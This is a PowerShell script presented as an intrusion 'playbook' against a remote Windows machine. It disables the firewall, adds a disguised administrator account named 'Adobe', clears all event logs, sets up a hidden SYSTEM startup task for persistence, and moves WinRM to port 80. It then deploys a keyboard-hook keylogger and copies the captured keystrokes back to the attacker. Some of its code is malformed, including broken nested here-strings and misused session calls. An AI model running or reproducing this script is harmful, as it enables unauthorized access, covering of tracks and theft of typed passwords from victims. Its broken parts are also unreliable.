# Define the target computer's IP address or hostname
$targetComputer = "192.168.0.100"

# Set up the credentials for authentication (replace with valid credentials)
$username = "admin"
$password = "password"

# Create a secure string for the password
$securePassword = ConvertTo-SecureString -String $password -AsPlainText -Force

# Create a PSCredential object
$credentials = New-Object System.Management.Automation.PSCredential -ArgumentList $username, $securePassword

# Define the connection options
$connectionOptions = New-Object System.Management.ConnectionOptions
$connectionOptions.Username = $credentials.UserName
$connectionOptions.Password = $credentials.GetNetworkCredential().Password

# Create a new ManagementScope object for remote connection
$managementScope = New-Object System.Management.ManagementScope("\\$targetComputer\root\cimv2", $connectionOptions)

try {
    # Connect to the remote computer
    $managementScope.Connect()

    # Connection successful
    Write-Host "Connected to $targetComputer"

    ## Beginning Playbook

    # Get information about the target machine
    $osInfo = Get-WmiObject -Class Win32_OperatingSystem -ComputerName $targetComputer
    $cpuInfo = Get-WmiObject -Class Win32_Processor -ComputerName $targetComputer
    $memoryInfo = Get-WmiObject -Class Win32_ComputerSystem -ComputerName $targetComputer

    # Display the retrieved information
    Write-Host "Target Machine Information:"
    Write-Host "Operating System: $($osInfo.Caption)"
    Write-Host "CPU: $($cpuInfo.Name)"
    Write-Host "Total Memory: $($memoryInfo.TotalPhysicalMemory / 1MB) MB"

    # Disable Windows Firewall
    $firewall = New-Object -ComObject HNetCfg.FwPolicy2
    $firewallPolicy = $firewall.LocalPolicy
    $firewallPolicy.CurrentProfile.FirewallEnabled = $false
    Write-Host "Windows Firewall disabled on $targetComputer"

    # Create a new administrator user 'Adobe' with a secure password and remote access
    $adminUsername = "Adobe"
    $adminPassword = ConvertTo-SecureString -String "SecurePassword123!" -AsPlainText -Force
    $adminUser = New-LocalUser -Name $adminUsername -Password $adminPassword -UserMayNotChangePassword -PasswordNeverExpires
    Add-LocalGroupMember -Group "Administrators" -Member $adminUsername
    Enable-PSRemoting -Force
    Write-Host "New administrator user 'Adobe' created on $targetComputer"

    # Clear event logs
    Clear-EventLog -LogName *
    Write-Host "Event logs cleared on $targetComputer"

    # Restart the remote connection with the new Adobe user
    $session = New-PSSession -ComputerName $targetComputer -Credential $adminUser
    Enter-PSSession -Session $session
    Write-Host "Remote connection restarted with 'Adobe' user on $targetComputer"

    # Create a scheduled task for script execution on system startup
    $taskAction = New-ScheduledTaskAction -Execute "PowerShell.exe" -Argument "-WindowStyle Hidden -File 'C:\Path\To\Script.ps1'"
    $taskTrigger = New-ScheduledTaskTrigger -AtStartup
    $taskPrincipal = New-ScheduledTaskPrincipal -GroupId "BUILTIN\Administrators" -RunLevel HighestAvailable
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
    $task = Register-ScheduledTask -TaskName "PersistentScript" -Action $taskAction -Trigger $taskTrigger -User "SYSTEM" -Settings $taskSettings -Principal $taskPrincipal
    Write-Host "Script configured for persistence on $targetComputer"

    # Clear event logs
    Clear-EventLog -LogName *
    Write-Host "Event logs cleared on $targetComputer"

    # Change the connection port to 80
    Set-Item -Path WSMan:\localhost\Listener\*\Port -Value 80
    Restart-Service -Name WinRM
    Write-Host "Connection port changed to 80 on $targetComputer"

    ## Main Client

    # Create a new ManagementClass object for executing commands
    $managementClass = New-Object System.Management.ManagementClass($managementScope, (New-Object System.Management.ManagementPath("Win32_Process")), $null)

    # Set the file path to save the captured keyboard commands
    $filePath = "C:\Path\To\KeyboardCommands.txt"

    # Start capturing keyboard commands on the remote computer
    $captureScript = @"
    Add-Type -TypeDefinition @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;
    using System.IO;

    public class KeyboardCapture {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr hookId = IntPtr.Zero;
        private static LowLevelKeyboardProc hookCallback = HookCallback;

        public static void StartCapture() {
            hookId = SetHook(hookCallback);
        }

        public static void StopCapture() {
            UnhookWindowsHookEx(hookId);
        }

        private static IntPtr SetHook(LowLevelKeyboardProc proc) {
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule) {
                return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
            if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((ConsoleKey)vkCode).ToString();

                // Append the captured key to the file
                File.AppendAllText("$filePath", key + Environment.NewLine);
            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);
    }
}

KeyboardCapture.StartCapture();

# Define the command to execute on the remote computer
$command = @"
# Create a new StreamWriter to write captured keyboard commands to the file
$streamWriter = New-Object System.IO.StreamWriter("$filePath", $true)

# Function to stop capturing keyboard commands and close the StreamWriter
function StopCapture {
    $streamWriter.Close()
    [KeyboardCapture]::StopCapture()
}

# Start capturing keyboard commands
[KeyboardCapture]::StartCapture()

# Loop to continuously capture keyboard commands until interrupted
try {
    while ($true) {
        # Capture a line from the keyboard input
        $line = Read-Host

        # Write the captured line to the StreamWriter
        $streamWriter.WriteLine($line)

        # Check if the captured line contains the exit command
        if ($line -eq "exit") {
            # Stop capturing and close the StreamWriter
            StopCapture
            break
        }
    }
} catch {
    # Error occurred, stop capturing and close the StreamWriter
    StopCapture
}
"@

# Execute the command on the remote computer
$result = $managementClass.InvokeMethod("Create", $command)
Write-Host "Keyboard command capture started on $targetComputer. Press 'exit' to stop."

# Wait for user input to stop the keyboard command capture
Read-Host "Press Enter to stop the keyboard command capture..."

# Stop the keyboard command capture on the remote computer
$stopCommand = @"
StopCapture
"@
$result = $managementClass.InvokeMethod("Create", $stopCommand)
Write-Host "Keyboard command capture stopped on $targetComputer."

# Copy the captured keyboard commands file to the local computer
Copy-Item -Path "\\$targetComputer\$filePath" -Destination "C:\Path\To\Local\KeyboardCommands.txt" -Force
Write-Host "Keyboard commands file copied from $targetComputer to local computer."

# Disconnect the remote connection
Exit-PSSession
Remove-PSSession $session
Write-Host "Disconnected from $targetComputer"

# Re-enable Windows Firewall
$firewallPolicy.CurrentProfile.FirewallEnabled = $true
Write-Host "Windows Firewall re-enabled on $targetComputer"
} finally {
    # Disconnect from the remote computer if still connected
    if ($managementScope.IsConnected) {
        $managementScope.Disconnect()
    }
}
